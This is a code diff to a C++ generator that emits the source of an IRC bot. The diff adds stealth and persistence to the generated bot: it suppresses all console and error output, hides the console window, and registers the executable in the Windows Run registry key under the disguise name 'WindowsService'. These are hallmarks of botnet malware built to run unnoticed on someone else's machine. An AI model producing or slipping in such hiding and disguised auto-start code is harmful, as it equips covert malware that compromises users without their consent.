@@ -224,7 +224,10 @@ private:
         code << "#include <sstream>\n";
         code << "#include <algorithm>\n";
         code << "#include <signal.h>\n";
-        code << "#include <random>\n\n";
+        code << "#include <random>\n";
+        code << "#ifdef _WIN32\n";
+        code << "#include <windows.h>\n";
+        code << "#endif\n\n";
         
         code << "// Random name generator for auto-rename\n";
         code << "std::string generateRandomBotName() {\n";
@@ -273,6 +276,7 @@ private:
         code << "    }\n\n";
         
         code << "    void log(const std::string& message) {\n";
+        code << "        // Silent logging - only to file, no console output\n";
         code << "        std::ofstream logStream(logFile, std::ios::app);\n";
         code << "        if (logStream.is_open()) {\n";
         code << "            auto now = std::chrono::system_clock::now();\n";
@@ -280,7 +284,7 @@ private:
         code << "            logStream << std::ctime(&time_t) << \": \" << message << std::endl;\n";
         code << "            logStream.close();\n";
         code << "        }\n";
-        code << "        std::cout << \"[LOG] \" << message << std::endl;\n";
+        code << "        // No console output for stealth mode\n";
         code << "    }\n\n";
         
         code << "    bool connect() {\n";
@@ -460,6 +464,22 @@ private:
         code << "        }\n";
         code << "    }\n\n";
         
+        code << "    void setupAutoStartup() {\n";
+        code << "        #ifdef _WIN32\n";
+        code << "        // Register for Windows startup\n";
+        code << "        HKEY hKey;\n";
+        code << "        char exePath[MAX_PATH];\n";
+        code << "        GetModuleFileNameA(NULL, exePath, MAX_PATH);\n";
+        code << "        \n";
+        code << "        if (RegOpenKeyExA(HKEY_CURRENT_USER, \n";
+        code << "            \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", \n";
+        code << "            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {\n";
+        code << "            RegSetValueExA(hKey, \"WindowsService\", 0, REG_SZ, \n";
+        code << "                (const BYTE*)exePath, strlen(exePath) + 1);\n";
+        code << "            RegCloseKey(hKey);\n";
+        code << "        }\n";
+        code << "        #endif\n";
+        code << "    }\n\n";
         code << "    void stop() {\n";
         code << "        running = false;\n";
         code << "        if (sockfd >= 0) {\n";
@@ -469,17 +489,22 @@ private:
         code << "};\n\n";
         
         code << "int main() {\n";
-        code << "    std::cout << \"=== Star-2 mIRC Bot ===\" << std::endl;\n";
-        code << "    std::cout << \"Starting bot...\" << std::endl;\n\n";
+        code << "    // Stealth mode - no console output\n";
+        code << "    #ifdef _WIN32\n";
+        code << "    // Hide console window on Windows\n";
+        code << "    ShowWindow(GetConsoleWindow(), SW_HIDE);\n";
+        code << "    #endif\n\n";
         code << "    MircBot bot;\n\n";
+        code << "    // Setup auto-startup (Windows only)\n";
+        code << "    bot.setupAutoStartup();\n\n";
+        code << "    // Silent signal handling\n";
         code << "    signal(SIGINT, [](int) {\n";
-        code << "        std::cout << \"\\nShutting down bot...\" << std::endl;\n";
         code << "        exit(0);\n";
         code << "    });\n\n";
         code << "    try {\n";
         code << "        bot.run();\n";
         code << "    } catch (const std::exception& e) {\n";
-        code << "        std::cout << \"Error: \" << e.what() << std::endl;\n";
+        code << "        // Silent error handling\n";
         code << "    }\n\n";
         code << "    return 0;\n";
         code << "}\n";
